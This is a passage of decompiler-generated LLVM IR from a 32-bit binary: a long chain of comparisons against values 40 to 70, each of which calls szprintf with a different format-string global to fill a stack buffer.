  %v13_804a78b = icmp eq i32 %v2_8049efa, 40
  %v1_804a78f = icmp eq i1 %v13_804a78b, false
  br i1 %v1_804a78f, label %dec_label_pc_804a7c1, label %dec_label_pc_804a791

dec_label_pc_804a791:                             ; preds = %dec_label_pc_804a78b
  %v0_804a791 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a791 = zext i8 %v0_804a791 to i32
  store i32 %v1_804a791, i32* @edx, align 4
  %v0_804a79b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a79b = zext i8 %v0_804a79b to i32
  %v2_804a7aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7aa, i32* @ebx, align 4
  %v4_804a7bc = call i32 @szprintf(i32 %v2_804a7aa, i32 ptrtoint ([13 x i8]* @global_var_8058647.80 to i32), i32 %v1_804a79b)
  br label %dec_label_pc_804a7c1

dec_label_pc_804a7c1:                             ; preds = %dec_label_pc_804a78b, %dec_label_pc_804a791
  %v13_804a7c1 = icmp eq i32 %v2_8049efa, 41
  %v1_804a7c5 = icmp eq i1 %v13_804a7c1, false
  br i1 %v1_804a7c5, label %dec_label_pc_804a7f7, label %dec_label_pc_804a7c7

dec_label_pc_804a7c7:                             ; preds = %dec_label_pc_804a7c1
  %v0_804a7c7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a7c7 = zext i8 %v0_804a7c7 to i32
  store i32 %v1_804a7c7, i32* @edx, align 4
  %v0_804a7d1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a7d1 = zext i8 %v0_804a7d1 to i32
  %v2_804a7e0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a7e0, i32* @ebx, align 4
  %v4_804a7f2 = call i32 @szprintf(i32 %v2_804a7e0, i32 ptrtoint ([13 x i8]* @global_var_8058661.82 to i32), i32 %v1_804a7d1)
  br label %dec_label_pc_804a7f7

dec_label_pc_804a7f7:                             ; preds = %dec_label_pc_804a7c1, %dec_label_pc_804a7c7
  %v13_804a7f7 = icmp eq i32 %v2_8049efa, 42
  %v1_804a7fb = icmp eq i1 %v13_804a7f7, false
  br i1 %v1_804a7fb, label %dec_label_pc_804a82d, label %dec_label_pc_804a7fd

dec_label_pc_804a7fd:                             ; preds = %dec_label_pc_804a7f7
  %v0_804a7fd = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a7fd = zext i8 %v0_804a7fd to i32
  store i32 %v1_804a7fd, i32* @edx, align 4
  %v0_804a807 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a807 = zext i8 %v0_804a807 to i32
  %v2_804a816 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a816, i32* @ebx, align 4
  %v4_804a828 = call i32 @szprintf(i32 %v2_804a816, i32 ptrtoint ([13 x i8]* @global_var_805866e.83 to i32), i32 %v1_804a807)
  br label %dec_label_pc_804a82d

dec_label_pc_804a82d:                             ; preds = %dec_label_pc_804a7f7, %dec_label_pc_804a7fd
  %v13_804a82d = icmp eq i32 %v2_8049efa, 43
  %v1_804a831 = icmp eq i1 %v13_804a82d, false
  br i1 %v1_804a831, label %dec_label_pc_804a863, label %dec_label_pc_804a833

dec_label_pc_804a833:                             ; preds = %dec_label_pc_804a82d
  %v0_804a833 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a833 = zext i8 %v0_804a833 to i32
  store i32 %v1_804a833, i32* @edx, align 4
  %v0_804a83d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a83d = zext i8 %v0_804a83d to i32
  %v2_804a84c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a84c, i32* @ebx, align 4
  %v4_804a85e = call i32 @szprintf(i32 %v2_804a84c, i32 ptrtoint ([13 x i8]* @global_var_805867b.84 to i32), i32 %v1_804a83d)
  br label %dec_label_pc_804a863

dec_label_pc_804a863:                             ; preds = %dec_label_pc_804a82d, %dec_label_pc_804a833
  %v13_804a863 = icmp eq i32 %v2_8049efa, 44
  %v1_804a867 = icmp eq i1 %v13_804a863, false
  br i1 %v1_804a867, label %dec_label_pc_804a899, label %dec_label_pc_804a869

dec_label_pc_804a869:                             ; preds = %dec_label_pc_804a863
  %v0_804a869 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a869 = zext i8 %v0_804a869 to i32
  store i32 %v1_804a869, i32* @edx, align 4
  %v0_804a873 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a873 = zext i8 %v0_804a873 to i32
  %v2_804a882 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a882, i32* @ebx, align 4
  %v4_804a894 = call i32 @szprintf(i32 %v2_804a882, i32 ptrtoint ([13 x i8]* @global_var_805866e.83 to i32), i32 %v1_804a873)
  br label %dec_label_pc_804a899

dec_label_pc_804a899:                             ; preds = %dec_label_pc_804a863, %dec_label_pc_804a869
  %v13_804a899 = icmp eq i32 %v2_8049efa, 45
  %v1_804a89d = icmp eq i1 %v13_804a899, false
  br i1 %v1_804a89d, label %dec_label_pc_804a8cf, label %dec_label_pc_804a89f

dec_label_pc_804a89f:                             ; preds = %dec_label_pc_804a899
  %v0_804a89f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a89f = zext i8 %v0_804a89f to i32
  store i32 %v1_804a89f, i32* @edx, align 4
  %v0_804a8a9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a8a9 = zext i8 %v0_804a8a9 to i32
  %v2_804a8b8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8b8, i32* @ebx, align 4
  %v4_804a8ca = call i32 @szprintf(i32 %v2_804a8b8, i32 ptrtoint ([13 x i8]* @global_var_8058688.85 to i32), i32 %v1_804a8a9)
  br label %dec_label_pc_804a8cf

dec_label_pc_804a8cf:                             ; preds = %dec_label_pc_804a899, %dec_label_pc_804a89f
  %v13_804a8cf = icmp eq i32 %v2_8049efa, 46
  %v1_804a8d3 = icmp eq i1 %v13_804a8cf, false
  br i1 %v1_804a8d3, label %dec_label_pc_804a905, label %dec_label_pc_804a8d5

dec_label_pc_804a8d5:                             ; preds = %dec_label_pc_804a8cf
  %v0_804a8d5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a8d5 = zext i8 %v0_804a8d5 to i32
  store i32 %v1_804a8d5, i32* @edx, align 4
  %v0_804a8df = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a8df = zext i8 %v0_804a8df to i32
  %v2_804a8ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a8ee, i32* @ebx, align 4
  %v4_804a900 = call i32 @szprintf(i32 %v2_804a8ee, i32 ptrtoint ([13 x i8]* @global_var_8058695.86 to i32), i32 %v1_804a8df)
  br label %dec_label_pc_804a905

dec_label_pc_804a905:                             ; preds = %dec_label_pc_804a8cf, %dec_label_pc_804a8d5
  %v13_804a905 = icmp eq i32 %v2_8049efa, 47
  %v1_804a909 = icmp eq i1 %v13_804a905, false
  br i1 %v1_804a909, label %dec_label_pc_804a93b, label %dec_label_pc_804a90b

dec_label_pc_804a90b:                             ; preds = %dec_label_pc_804a905
  %v0_804a90b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a90b = zext i8 %v0_804a90b to i32
  store i32 %v1_804a90b, i32* @edx, align 4
  %v0_804a915 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a915 = zext i8 %v0_804a915 to i32
  %v2_804a924 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a924, i32* @ebx, align 4
  %v4_804a936 = call i32 @szprintf(i32 %v2_804a924, i32 ptrtoint ([13 x i8]* @global_var_80586a2.87 to i32), i32 %v1_804a915)
  br label %dec_label_pc_804a93b

dec_label_pc_804a93b:                             ; preds = %dec_label_pc_804a905, %dec_label_pc_804a90b
  %v10_804a93b = icmp eq i32 %v2_8049efa, 48
  %v1_804a93f = icmp eq i1 %v10_804a93b, false
  br i1 %v1_804a93f, label %dec_label_pc_804a971, label %dec_label_pc_804a941

dec_label_pc_804a941:                             ; preds = %dec_label_pc_804a93b
  %v0_804a941 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a941 = zext i8 %v0_804a941 to i32
  store i32 %v1_804a941, i32* @edx, align 4
  %v0_804a94b = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a94b = zext i8 %v0_804a94b to i32
  %v2_804a95a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a95a, i32* @ebx, align 4
  %v4_804a96c = call i32 @szprintf(i32 %v2_804a95a, i32 ptrtoint ([13 x i8]* @global_var_80586af.88 to i32), i32 %v1_804a94b)
  br label %dec_label_pc_804a971

dec_label_pc_804a971:                             ; preds = %dec_label_pc_804a93b, %dec_label_pc_804a941
  %v13_804a971 = icmp eq i32 %v2_8049efa, 49
  %v1_804a975 = icmp eq i1 %v13_804a971, false
  br i1 %v1_804a975, label %dec_label_pc_804a9a7, label %dec_label_pc_804a977

dec_label_pc_804a977:                             ; preds = %dec_label_pc_804a971
  %v0_804a977 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a977 = zext i8 %v0_804a977 to i32
  store i32 %v1_804a977, i32* @edx, align 4
  %v0_804a981 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a981 = zext i8 %v0_804a981 to i32
  %v2_804a990 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a990, i32* @ebx, align 4
  %v4_804a9a2 = call i32 @szprintf(i32 %v2_804a990, i32 ptrtoint ([13 x i8]* @global_var_80586bc.89 to i32), i32 %v1_804a981)
  br label %dec_label_pc_804a9a7

dec_label_pc_804a9a7:                             ; preds = %dec_label_pc_804a971, %dec_label_pc_804a977
  %v13_804a9a7 = icmp eq i32 %v2_8049efa, 50
  %v1_804a9ab = icmp eq i1 %v13_804a9a7, false
  br i1 %v1_804a9ab, label %dec_label_pc_804a9dd, label %dec_label_pc_804a9ad

dec_label_pc_804a9ad:                             ; preds = %dec_label_pc_804a9a7
  %v0_804a9ad = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a9ad = zext i8 %v0_804a9ad to i32
  store i32 %v1_804a9ad, i32* @edx, align 4
  %v0_804a9b7 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a9b7 = zext i8 %v0_804a9b7 to i32
  %v2_804a9c6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9c6, i32* @ebx, align 4
  %v4_804a9d8 = call i32 @szprintf(i32 %v2_804a9c6, i32 ptrtoint ([14 x i8]* @global_var_80586c9.90 to i32), i32 %v1_804a9b7)
  br label %dec_label_pc_804a9dd

dec_label_pc_804a9dd:                             ; preds = %dec_label_pc_804a9a7, %dec_label_pc_804a9ad
  %v13_804a9dd = icmp eq i32 %v2_8049efa, 51
  %v1_804a9e1 = icmp eq i1 %v13_804a9dd, false
  br i1 %v1_804a9e1, label %dec_label_pc_804aa13, label %dec_label_pc_804a9e3

dec_label_pc_804a9e3:                             ; preds = %dec_label_pc_804a9dd
  %v0_804a9e3 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804a9e3 = zext i8 %v0_804a9e3 to i32
  store i32 %v1_804a9e3, i32* @edx, align 4
  %v0_804a9ed = load i8, i8* @global_var_805b559.40, align 1
  %v1_804a9ed = zext i8 %v0_804a9ed to i32
  %v2_804a9fc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a9fc, i32* @ebx, align 4
  %v4_804aa0e = call i32 @szprintf(i32 %v2_804a9fc, i32 ptrtoint ([14 x i8]* @global_var_80586d7.91 to i32), i32 %v1_804a9ed)
  br label %dec_label_pc_804aa13

dec_label_pc_804aa13:                             ; preds = %dec_label_pc_804a9dd, %dec_label_pc_804a9e3
  %v13_804aa13 = icmp eq i32 %v2_8049efa, 52
  %v1_804aa17 = icmp eq i1 %v13_804aa13, false
  br i1 %v1_804aa17, label %dec_label_pc_804aa49, label %dec_label_pc_804aa19

dec_label_pc_804aa19:                             ; preds = %dec_label_pc_804aa13
  %v0_804aa19 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa19 = zext i8 %v0_804aa19 to i32
  store i32 %v1_804aa19, i32* @edx, align 4
  %v0_804aa23 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa23 = zext i8 %v0_804aa23 to i32
  %v2_804aa32 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa32, i32* @ebx, align 4
  %v4_804aa44 = call i32 @szprintf(i32 %v2_804aa32, i32 ptrtoint ([13 x i8]* @global_var_80586e5.92 to i32), i32 %v1_804aa23)
  br label %dec_label_pc_804aa49

dec_label_pc_804aa49:                             ; preds = %dec_label_pc_804aa13, %dec_label_pc_804aa19
  %v13_804aa49 = icmp eq i32 %v2_8049efa, 53
  %v1_804aa4d = icmp eq i1 %v13_804aa49, false
  br i1 %v1_804aa4d, label %dec_label_pc_804aa7f, label %dec_label_pc_804aa4f

dec_label_pc_804aa4f:                             ; preds = %dec_label_pc_804aa49
  %v0_804aa4f = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa4f = zext i8 %v0_804aa4f to i32
  store i32 %v1_804aa4f, i32* @edx, align 4
  %v0_804aa59 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa59 = zext i8 %v0_804aa59 to i32
  %v2_804aa68 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa68, i32* @ebx, align 4
  %v4_804aa7a = call i32 @szprintf(i32 %v2_804aa68, i32 ptrtoint ([14 x i8]* @global_var_80586f2.93 to i32), i32 %v1_804aa59)
  br label %dec_label_pc_804aa7f

dec_label_pc_804aa7f:                             ; preds = %dec_label_pc_804aa49, %dec_label_pc_804aa4f
  %v13_804aa7f = icmp eq i32 %v2_8049efa, 54
  %v1_804aa83 = icmp eq i1 %v13_804aa7f, false
  br i1 %v1_804aa83, label %dec_label_pc_804aab5, label %dec_label_pc_804aa85

dec_label_pc_804aa85:                             ; preds = %dec_label_pc_804aa7f
  %v0_804aa85 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aa85 = zext i8 %v0_804aa85 to i32
  store i32 %v1_804aa85, i32* @edx, align 4
  %v0_804aa8f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aa8f = zext i8 %v0_804aa8f to i32
  %v2_804aa9e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aa9e, i32* @ebx, align 4
  %v4_804aab0 = call i32 @szprintf(i32 %v2_804aa9e, i32 ptrtoint ([15 x i8]* @global_var_8058700.94 to i32), i32 %v1_804aa8f)
  br label %dec_label_pc_804aab5

dec_label_pc_804aab5:                             ; preds = %dec_label_pc_804aa7f, %dec_label_pc_804aa85
  %v13_804aab5 = icmp eq i32 %v2_8049efa, 55
  %v1_804aab9 = icmp eq i1 %v13_804aab5, false
  br i1 %v1_804aab9, label %dec_label_pc_804aaeb, label %dec_label_pc_804aabb

dec_label_pc_804aabb:                             ; preds = %dec_label_pc_804aab5
  %v0_804aabb = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aabb = zext i8 %v0_804aabb to i32
  store i32 %v1_804aabb, i32* @edx, align 4
  %v0_804aac5 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aac5 = zext i8 %v0_804aac5 to i32
  %v2_804aad4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804aad4, i32* @ebx, align 4
  %v4_804aae6 = call i32 @szprintf(i32 %v2_804aad4, i32 ptrtoint ([14 x i8]* @global_var_805870f.95 to i32), i32 %v1_804aac5)
  br label %dec_label_pc_804aaeb

dec_label_pc_804aaeb:                             ; preds = %dec_label_pc_804aab5, %dec_label_pc_804aabb
  %v13_804aaeb = icmp eq i32 %v2_8049efa, 56
  %v1_804aaef = icmp eq i1 %v13_804aaeb, false
  br i1 %v1_804aaef, label %dec_label_pc_804ab21, label %dec_label_pc_804aaf1

dec_label_pc_804aaf1:                             ; preds = %dec_label_pc_804aaeb
  %v0_804aaf1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aaf1 = zext i8 %v0_804aaf1 to i32
  store i32 %v1_804aaf1, i32* @edx, align 4
  %v0_804aafb = load i8, i8* @global_var_805b559.40, align 1
  %v1_804aafb = zext i8 %v0_804aafb to i32
  %v2_804ab0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab0a, i32* @ebx, align 4
  %v4_804ab1c = call i32 @szprintf(i32 %v2_804ab0a, i32 ptrtoint ([14 x i8]* @global_var_805871d.96 to i32), i32 %v1_804aafb)
  br label %dec_label_pc_804ab21

dec_label_pc_804ab21:                             ; preds = %dec_label_pc_804aaeb, %dec_label_pc_804aaf1
  %v13_804ab21 = icmp eq i32 %v2_8049efa, 57
  %v1_804ab25 = icmp eq i1 %v13_804ab21, false
  br i1 %v1_804ab25, label %dec_label_pc_804ab57, label %dec_label_pc_804ab27

dec_label_pc_804ab27:                             ; preds = %dec_label_pc_804ab21
  %v0_804ab27 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab27 = zext i8 %v0_804ab27 to i32
  store i32 %v1_804ab27, i32* @edx, align 4
  %v0_804ab31 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab31 = zext i8 %v0_804ab31 to i32
  %v2_804ab40 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab40, i32* @ebx, align 4
  %v4_804ab52 = call i32 @szprintf(i32 %v2_804ab40, i32 ptrtoint ([13 x i8]* @global_var_805872b.97 to i32), i32 %v1_804ab31)
  br label %dec_label_pc_804ab57

dec_label_pc_804ab57:                             ; preds = %dec_label_pc_804ab21, %dec_label_pc_804ab27
  %v13_804ab57 = icmp eq i32 %v2_8049efa, 58
  %v1_804ab5b = icmp eq i1 %v13_804ab57, false
  br i1 %v1_804ab5b, label %dec_label_pc_804ab8d, label %dec_label_pc_804ab5d

dec_label_pc_804ab5d:                             ; preds = %dec_label_pc_804ab57
  %v0_804ab5d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab5d = zext i8 %v0_804ab5d to i32
  store i32 %v1_804ab5d, i32* @edx, align 4
  %v0_804ab67 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab67 = zext i8 %v0_804ab67 to i32
  %v2_804ab76 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ab76, i32* @ebx, align 4
  %v4_804ab88 = call i32 @szprintf(i32 %v2_804ab76, i32 ptrtoint ([14 x i8]* @global_var_8058738.98 to i32), i32 %v1_804ab67)
  br label %dec_label_pc_804ab8d

dec_label_pc_804ab8d:                             ; preds = %dec_label_pc_804ab57, %dec_label_pc_804ab5d
  %v13_804ab8d = icmp eq i32 %v2_8049efa, 59
  %v1_804ab91 = icmp eq i1 %v13_804ab8d, false
  br i1 %v1_804ab91, label %dec_label_pc_804abc3, label %dec_label_pc_804ab93

dec_label_pc_804ab93:                             ; preds = %dec_label_pc_804ab8d
  %v0_804ab93 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ab93 = zext i8 %v0_804ab93 to i32
  store i32 %v1_804ab93, i32* @edx, align 4
  %v0_804ab9d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ab9d = zext i8 %v0_804ab9d to i32
  %v2_804abac = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abac, i32* @ebx, align 4
  %v4_804abbe = call i32 @szprintf(i32 %v2_804abac, i32 ptrtoint ([14 x i8]* @global_var_8058746.99 to i32), i32 %v1_804ab9d)
  br label %dec_label_pc_804abc3

dec_label_pc_804abc3:                             ; preds = %dec_label_pc_804ab8d, %dec_label_pc_804ab93
  %v13_804abc3 = icmp eq i32 %v2_8049efa, 60
  %v1_804abc7 = icmp eq i1 %v13_804abc3, false
  br i1 %v1_804abc7, label %dec_label_pc_804abf9, label %dec_label_pc_804abc9

dec_label_pc_804abc9:                             ; preds = %dec_label_pc_804abc3
  %v0_804abc9 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804abc9 = zext i8 %v0_804abc9 to i32
  store i32 %v1_804abc9, i32* @edx, align 4
  %v0_804abd3 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804abd3 = zext i8 %v0_804abd3 to i32
  %v2_804abe2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804abe2, i32* @ebx, align 4
  %v4_804abf4 = call i32 @szprintf(i32 %v2_804abe2, i32 ptrtoint ([14 x i8]* @global_var_8058754.100 to i32), i32 %v1_804abd3)
  br label %dec_label_pc_804abf9

dec_label_pc_804abf9:                             ; preds = %dec_label_pc_804abc3, %dec_label_pc_804abc9
  %v13_804abf9 = icmp eq i32 %v2_8049efa, 61
  %v1_804abfd = icmp eq i1 %v13_804abf9, false
  br i1 %v1_804abfd, label %dec_label_pc_804ac2f, label %dec_label_pc_804abff

dec_label_pc_804abff:                             ; preds = %dec_label_pc_804abf9
  %v0_804abff = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804abff = zext i8 %v0_804abff to i32
  store i32 %v1_804abff, i32* @edx, align 4
  %v0_804ac09 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac09 = zext i8 %v0_804ac09 to i32
  %v2_804ac18 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac18, i32* @ebx, align 4
  %v4_804ac2a = call i32 @szprintf(i32 %v2_804ac18, i32 ptrtoint ([14 x i8]* @global_var_8058762.101 to i32), i32 %v1_804ac09)
  br label %dec_label_pc_804ac2f

dec_label_pc_804ac2f:                             ; preds = %dec_label_pc_804abf9, %dec_label_pc_804abff
  %v13_804ac2f = icmp eq i32 %v2_8049efa, 62
  %v1_804ac33 = icmp eq i1 %v13_804ac2f, false
  br i1 %v1_804ac33, label %dec_label_pc_804ac65, label %dec_label_pc_804ac35

dec_label_pc_804ac35:                             ; preds = %dec_label_pc_804ac2f
  %v0_804ac35 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ac35 = zext i8 %v0_804ac35 to i32
  store i32 %v1_804ac35, i32* @edx, align 4
  %v0_804ac3f = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac3f = zext i8 %v0_804ac3f to i32
  %v2_804ac4e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac4e, i32* @ebx, align 4
  %v4_804ac60 = call i32 @szprintf(i32 %v2_804ac4e, i32 ptrtoint ([14 x i8]* @global_var_8058770.102 to i32), i32 %v1_804ac3f)
  br label %dec_label_pc_804ac65

dec_label_pc_804ac65:                             ; preds = %dec_label_pc_804ac2f, %dec_label_pc_804ac35
  %v13_804ac65 = icmp eq i32 %v2_8049efa, 63
  %v1_804ac69 = icmp eq i1 %v13_804ac65, false
  br i1 %v1_804ac69, label %dec_label_pc_804ac9b, label %dec_label_pc_804ac6b

dec_label_pc_804ac6b:                             ; preds = %dec_label_pc_804ac65
  %v0_804ac6b = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ac6b = zext i8 %v0_804ac6b to i32
  store i32 %v1_804ac6b, i32* @edx, align 4
  %v0_804ac75 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ac75 = zext i8 %v0_804ac75 to i32
  %v2_804ac84 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ac84, i32* @ebx, align 4
  %v4_804ac96 = call i32 @szprintf(i32 %v2_804ac84, i32 ptrtoint ([14 x i8]* @global_var_805877e.103 to i32), i32 %v1_804ac75)
  br label %dec_label_pc_804ac9b

dec_label_pc_804ac9b:                             ; preds = %dec_label_pc_804ac65, %dec_label_pc_804ac6b
  %v10_804ac9b = icmp eq i32 %v2_8049efa, 64
  %v1_804ac9f = icmp eq i1 %v10_804ac9b, false
  br i1 %v1_804ac9f, label %dec_label_pc_804acd1, label %dec_label_pc_804aca1

dec_label_pc_804aca1:                             ; preds = %dec_label_pc_804ac9b
  %v0_804aca1 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804aca1 = zext i8 %v0_804aca1 to i32
  store i32 %v1_804aca1, i32* @edx, align 4
  %v0_804acab = load i8, i8* @global_var_805b559.40, align 1
  %v1_804acab = zext i8 %v0_804acab to i32
  %v2_804acba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acba, i32* @ebx, align 4
  %v4_804accc = call i32 @szprintf(i32 %v2_804acba, i32 ptrtoint ([14 x i8]* @global_var_805878c.104 to i32), i32 %v1_804acab)
  br label %dec_label_pc_804acd1

dec_label_pc_804acd1:                             ; preds = %dec_label_pc_804ac9b, %dec_label_pc_804aca1
  %v13_804acd1 = icmp eq i32 %v2_8049efa, 65
  %v1_804acd5 = icmp eq i1 %v13_804acd1, false
  br i1 %v1_804acd5, label %dec_label_pc_804ad07, label %dec_label_pc_804acd7

dec_label_pc_804acd7:                             ; preds = %dec_label_pc_804acd1
  %v0_804acd7 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804acd7 = zext i8 %v0_804acd7 to i32
  store i32 %v1_804acd7, i32* @edx, align 4
  %v0_804ace1 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ace1 = zext i8 %v0_804ace1 to i32
  %v2_804acf0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804acf0, i32* @ebx, align 4
  %v4_804ad02 = call i32 @szprintf(i32 %v2_804acf0, i32 ptrtoint ([14 x i8]* @global_var_805879a.105 to i32), i32 %v1_804ace1)
  br label %dec_label_pc_804ad07

dec_label_pc_804ad07:                             ; preds = %dec_label_pc_804acd1, %dec_label_pc_804acd7
  %v13_804ad07 = icmp eq i32 %v2_8049efa, 66
  %v1_804ad0b = icmp eq i1 %v13_804ad07, false
  br i1 %v1_804ad0b, label %dec_label_pc_804ad3d, label %dec_label_pc_804ad0d

dec_label_pc_804ad0d:                             ; preds = %dec_label_pc_804ad07
  %v0_804ad0d = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad0d = zext i8 %v0_804ad0d to i32
  store i32 %v1_804ad0d, i32* @edx, align 4
  %v0_804ad17 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad17 = zext i8 %v0_804ad17 to i32
  %v2_804ad26 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad26, i32* @ebx, align 4
  %v4_804ad38 = call i32 @szprintf(i32 %v2_804ad26, i32 ptrtoint ([14 x i8]* @global_var_80587a8.106 to i32), i32 %v1_804ad17)
  br label %dec_label_pc_804ad3d

dec_label_pc_804ad3d:                             ; preds = %dec_label_pc_804ad07, %dec_label_pc_804ad0d
  %v13_804ad3d = icmp eq i32 %v2_8049efa, 67
  %v1_804ad41 = icmp eq i1 %v13_804ad3d, false
  br i1 %v1_804ad41, label %dec_label_pc_804ad73, label %dec_label_pc_804ad43

dec_label_pc_804ad43:                             ; preds = %dec_label_pc_804ad3d
  %v0_804ad43 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad43 = zext i8 %v0_804ad43 to i32
  store i32 %v1_804ad43, i32* @edx, align 4
  %v0_804ad4d = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad4d = zext i8 %v0_804ad4d to i32
  %v2_804ad5c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad5c, i32* @ebx, align 4
  %v4_804ad6e = call i32 @szprintf(i32 %v2_804ad5c, i32 ptrtoint ([14 x i8]* @global_var_80587b6.107 to i32), i32 %v1_804ad4d)
  br label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad3d, %dec_label_pc_804ad43
  %v13_804ad73 = icmp eq i32 %v2_8049efa, 68
  %v1_804ad77 = icmp eq i1 %v13_804ad73, false
  br i1 %v1_804ad77, label %dec_label_pc_804ada9, label %dec_label_pc_804ad79

dec_label_pc_804ad79:                             ; preds = %dec_label_pc_804ad73
  %v0_804ad79 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ad79 = zext i8 %v0_804ad79 to i32
  store i32 %v1_804ad79, i32* @edx, align 4
  %v0_804ad83 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804ad83 = zext i8 %v0_804ad83 to i32
  %v2_804ad92 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804ad92, i32* @ebx, align 4
  %v4_804ada4 = call i32 @szprintf(i32 %v2_804ad92, i32 ptrtoint ([14 x i8]* @global_var_80587c4.108 to i32), i32 %v1_804ad83)
  br label %dec_label_pc_804ada9

dec_label_pc_804ada9:                             ; preds = %dec_label_pc_804ad73, %dec_label_pc_804ad79
  %v13_804ada9 = icmp eq i32 %v2_8049efa, 69
  %v1_804adad = icmp eq i1 %v13_804ada9, false
  br i1 %v1_804adad, label %dec_label_pc_804addf, label %dec_label_pc_804adaf

dec_label_pc_804adaf:                             ; preds = %dec_label_pc_804ada9
  %v0_804adaf = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804adaf = zext i8 %v0_804adaf to i32
  store i32 %v1_804adaf, i32* @edx, align 4
  %v0_804adb9 = load i8, i8* @global_var_805b559.40, align 1
  %v1_804adb9 = zext i8 %v0_804adb9 to i32
  %v2_804adc8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804adc8, i32* @ebx, align 4
  %v4_804adda = call i32 @szprintf(i32 %v2_804adc8, i32 ptrtoint ([14 x i8]* @global_var_80587d2.109 to i32), i32 %v1_804adb9)
  br label %dec_label_pc_804addf

dec_label_pc_804addf:                             ; preds = %dec_label_pc_804ada9, %dec_label_pc_804adaf
  %v13_804addf = icmp eq i32 %v2_8049efa, 70
  %v1_804ade3 = icmp eq i1 %v13_804addf, false
  br i1 %v1_804ade3, label %dec_label_pc_804ae15, label %dec_label_pc_804ade5

dec_label_pc_804ade5:                             ; preds = %dec_label_pc_804addf
  %v0_804ade5 = load i8, i8* @global_var_805b55a.41, align 2
  %v1_804ade5 = zext i8 %v0_804ade5 to i32
  store i32 %v1_804ade5, i32* @edx, align 4
